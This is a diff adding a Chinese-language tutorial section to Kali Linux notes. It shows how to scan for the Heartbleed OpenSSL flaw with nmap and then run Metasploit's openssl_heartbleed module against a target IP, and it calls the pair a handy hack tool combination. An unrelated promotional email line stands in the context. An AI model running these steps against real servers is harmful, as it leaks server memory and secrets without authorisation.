@@ -15,3 +15,26 @@ deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling-only main non-free con
 2. restart the network-manager `service network-manager restart`
 3. [获取网址]
 如果您需要获取本站最新网址，可随时发任意邮件至  GreenDizhi@gmail.com  系统将自动回复最新网址到您的邮箱。
+
+## heartbleed
+nmap+msfconsole</br>
+非常实用的hack工具组合，首先得升级msfconsole至最新版，然后给nmap添加一个针对heartbleed的扫描脚本，用来发现心脏出血漏洞：
+```
+cd /usr/share/nmap/scripts/
+wget https://svn.nmap.org/nmap/scripts/ssl-heartbleed.nse
+cd /usr/share/nmap/nselib/
+wget https://svn.nmap.org/nmap/nselib/tls.lua
+nmap --script-updatedb
+```
+添加成功之后扫描一个没有更新openssl的网站：
+`nmap -n -p 443 -Pn --script=ssl-heartbleed servers_ip`
+出现如下漏洞信息：
+
+然后`msfconsole`载入 `auxiliary/scanner/ssl/openssl_heartbleed` 模块：
+```
+msf > use auxiliary/scanner/ssl/openssl_heartbleed
+set RHOSTS xxx_ip
+set RPORT 443
+set VERBOSE true
+exploit
+```
